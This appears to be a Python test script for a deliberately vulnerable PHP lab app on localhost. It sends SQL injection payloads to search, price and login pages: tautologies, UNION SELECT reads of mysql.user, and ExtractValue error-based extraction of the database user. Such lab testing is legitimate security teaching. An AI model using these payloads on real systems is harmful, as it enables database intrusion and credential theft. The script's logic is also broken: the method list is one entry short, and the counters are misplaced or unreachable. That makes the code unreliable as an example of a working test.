import sys
import requests
urls = ["http://localhost:4000/find.php?search=apple",
    "http://localhost:4000/find2.php?search=apple",
    "http://localhost:4000/find3.php?search=apple",
    "http://localhost:4000/search.php?search=apple",
    "http://localhost:4000/search_by_price.php?max=1.00",
    "http://localhost:4000/search_by_price2.php?max=1.00",
    "http://localhost:4000/search_by_price3.php?max=1.00",
    "http://localhost:4000/search_by_price4.php?max=1.00",
    "http://localhost:4000/login.php?user=admin&pass=password",
    "http://localhost:4000/login2.php?user=admin&pass=password",
    "http://localhost:4000/login3.php?user=admin&pass=password"
    ]
urlMethods = ["GET",
    "GET",
    "GET",
    "GET",
    "GET",
    "GET",
    "GET",
    "POST",
    "POST",
    "POST"
    ]
attacks = ["' -- -", 
    "a' OR True -- -", 
    'a" OR True -- -',      #double quote
    "a%' OR True -- -",     #percentage
    "1 OR True -- -",       #integer Injection
    "1 OR True -- -",       #integer Injection 3
    "1 OR True -- -",       #integer Injection 4
    "a' OR True Limit 2,1-- -", 
    "a' union all select 0, User from mysql.user -- -",
     "a' union all select 0,0,0, User from mysql.user -- -",
    "a' OR True union all select 0, User from mysql.user -- -",
    "a' And ExtractValue(0, Concat(0x5c, user())) -- -"]
outputItems = ["Apple","Apple","Apple","Apple","Apple","3.00","Orange","Cherry", "Apple", "Apple","Apple", "root@localhost"]
outputUsers = ["admin!","admin!","admin!","admin!","admin!","admin!","admin!","guest2!", "admin!","0!", "admin!", "root@localhost"]


def test_attackable():
   
    indexUrl = 0
    for url in urls:
        index = 0
        for attack in attacks:
            finalUrl = url + attack
           
            if urlMethods[indexUrl] == "GET":
            	r = requests.get(finalUrl)
            	#Assertion for items tables
            	if outputItems[index] in str(r.text):
            		assert True;
            	else:
            		assert False;
            elif urlMethods[indexUrl] == "POST":
            	payload={}
            	
            	urlPart = finalUrl.split('?') 
            	print (len(urlPart))
            	url = urlPart[0]  
            	paramData = urlPart[1]    
            	params = paramData.split('&') 
            	for param in params:
            		key = param.split('=')[0] 
            		value = param.split('=')[1] 
            		payload[key] = value 
            	r = requests.post(url, data=payload)
            	#Assertion for users tables
            	if outputUsers[index] in str(r.text):
            		assert True;
            	else:
            		assert False;
            
            		index+=1
            	indexUrl+=1

        print('-------------\n')
